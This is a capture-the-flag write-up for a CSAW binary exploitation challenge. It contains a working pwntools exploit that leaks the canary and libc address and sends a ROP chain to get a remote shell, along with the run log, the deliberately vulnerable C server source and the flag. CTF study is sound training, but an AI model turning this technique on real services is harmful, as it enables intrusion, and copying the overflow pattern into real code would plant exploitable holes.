# Tutorial

```
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

As we can see, the binary contains NX + canary. Still this does not mean that the exploitation would be more difficult, 
because there is a puts leak (option 1) and canary leak (option 2).

Exploit:

```python
#!/usr/bin/env python

from pwn import *
from sys import argv

local = False

def p(string): print text.green_on_black("[*] " + string)

def leak_canary():
  x.send("2\n\n")
  x.recvline()
  x.recvline()
  return u64(x.recvline()[311:319])

def leak_puts_address():
  x.send("1\n")
  x.recvuntil("Reference:")
  puts_addr = int(x.recvline().rstrip(), 16) + 0x500
  x.recvuntil('>')
  return puts_addr

def send_exploit(canary, system, shell, dup2, descriptor):
  pop_rdi_ret_address = 0x4012e3
  pop_rsi_pop_r15_ret_address = 0x4012e1

  x.sendline("2")
  x.recvuntil('>')

  payload  = "A" * 312
  payload += p64(canary)
  payload += "Aa0Aa1Aa"

  """
  dup2(rdi = 5, rsi = 0)
  dup2(rdi = 5, rsi = 1)
  """
  payload += p64(pop_rdi_ret_address)
  payload += p64(descriptor)

  payload += p64(pop_rsi_pop_r15_ret_address)
  payload += p64(0)
  payload += p64(0xdeadbeef)
  payload += p64(dup2)

  payload += p64(pop_rsi_pop_r15_ret_address)
  payload += p64(1)
  payload += p64(0xdeadbeef)
  payload += p64(dup2)

  payload += p64(pop_rdi_ret_address)
  payload += p64(shell)

  payload += p64(system)

  x.sendline(payload)

if __name__ == "__main__":

  if local:
    x = remote('127.0.0.1', argv[1])
    libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
    descriptor = 5
  else:
    x = remote('pwn.chal.csaw.io', '8002')
    libc = ELF('./libc-2.19.so')
    descriptor = 4
    
  x.recvuntil(">")

  canary_leak = leak_canary()
  p(hex(canary_leak) + " <- leaked canary")

  puts_leak = leak_puts_address()
  p(hex(puts_leak) + " <- leaked puts() address")

  libc.address = puts_leak - libc.symbols['puts']
  p(hex(libc.address) + " <- libc base address")

  system_address = libc.symbols['system']
  p(hex(system_address) + " <- computed system() address")

  dup2_address = libc.symbols['dup2']
  p(hex(dup2_address) + " <- computed dup2() address")

  shell_address = next(libc.search('sh\x00'))
  p(hex(shell_address) + " <- computed 'sh\\x00' address")

  send_exploit(canary_leak, system_address, shell_address, dup2_address, descriptor)

  x.interactive()
```

```
$ ./exploit.py
[+] Opening connection to pwn.chal.csaw.io on port 8002: Done
[*] '/root/Tutorial/libc-2.19.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] 0xb07981a03b326d00 <- leaked canary
[*] 0x7f70aa363d60 <- leaked puts() address
[*] 0x7f70aa2f4000 <- libc base address
[*] 0x7f70aa33a590 <- computed system() address
[*] 0x7f70aa3dfe90 <- computed dup2() address
[*] 0x7f70aa305c37 <- computed 'sh\x00' address
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00m2;\xa0\x81y\xb0Aa0A$ id
uid=1000(tutorial) gid=1000(tutorial) groups=1000(tutorial)
$ ls
flag.txt
tutorial
tutorial.c
```

`tutorial.c`:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <pwd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <dlfcn.h>
#include <errno.h>
#include <signal.h>
#include <unistd.h>
#include <stdint.h>

int priv(char *username) {
    struct passwd *pw = getpwnam(username);
    if (pw == NULL) {
        fprintf(stderr, "User %s does not exist\n", username);
        return 1;
    }

    if (chdir(pw->pw_dir) != 0) {
        perror("chdir");
        return 1;
    }


    if (setgroups(0, NULL) != 0) {
        perror("setgroups");
        return 1;
    }

    if (setgid(pw->pw_gid) != 0) {
        perror("setgid");
        return 1;
    }

    if (setuid(pw->pw_uid) != 0) {
        perror("setuid");
        return 1;
    }

    return 0;
}

void func1(int fd){


    char address[50];
    void (*puts_addr)(int) = dlsym(RTLD_NEXT,"puts");
        write(fd,"Reference:",10);
    sprintf(address,"%p\n",puts_addr-0x500);
        write(fd,address,15);



}

void func2(int fd){
    char pov[300];
    bzero(pov,300);

    write(fd,"Time to test your exploit...\n",29);
    write(fd,">",1);
    read(fd,pov,460);
    write(fd,pov,324);

}



void menu(int fd){
    while(1){
        char option[2];
        write(fd,"-Tutorial-\n",11);
        write(fd,"1.Manual\n",9);
        write(fd,"2.Practice\n",11);
        write(fd,"3.Quit\n",7);
        write(fd,">",1);        read(fd,option,2);
        switch(option[0]){
            case '1':
                func1(fd);
                break;
            case '2':
                func2(fd);
                break;
            case '3':
                write(fd,"You still did not solve my challenge.\n",38);
                return;
            default:
                write(fd,"unknown option.\n",16);
                break;
        }
    }
}

int main( int argc, char *argv[] ) {
  int five;
  int myint = 1;
  struct sockaddr_in server,client;
  sigemptyset((sigset_t *)&five);
  int init_fd = socket(AF_INET, SOCK_STREAM, 0);

  if (init_fd == -1) {
     perror("socket");
     exit(-1);
  }
  bzero((char *) &server, sizeof(server));

  if(setsockopt(init_fd,SOL_SOCKET,SO_REUSEADDR,&myint,sizeof(myint)) == -1){
    perror("setsocket");
      exit(-1);
  }

  server.sin_family = AF_INET;
  server.sin_addr.s_addr = htonl(INADDR_ANY);
  server.sin_port = htons(atoi(argv[1]));

  if (bind(init_fd, (struct sockaddr *) &server, sizeof(server)) == -1) {
     perror("bind");
     exit(-1);
  }

  if((listen(init_fd,20)) == -1){
     perror("listen");
     exit(-1);
  }
  int addr_len = sizeof(client);

   while (1) {

        int fd = accept(init_fd,(struct sockaddr *)&client,(socklen_t*)&addr_len);

     if (fd < 0) {
        perror("accept");
        exit(1);
     }
     pid_t pid = fork();

     if (pid == -1) {
       perror("fork");
       close(fd);
     }

     if (pid == 0){
      alarm(15);
          close(init_fd);
      int user_priv = priv("tutorial");
      if(!user_priv){
              menu(fd);
        close(fd);
            exit(0);
      }
     }else{
            close(fd);
      }

    }
  close(init_fd);
}
```

```
$ cat flag.txt
FLAG{3ASY_R0P_R0P_P0P_P0P_YUM_YUM_CHUM_CHUM}
```
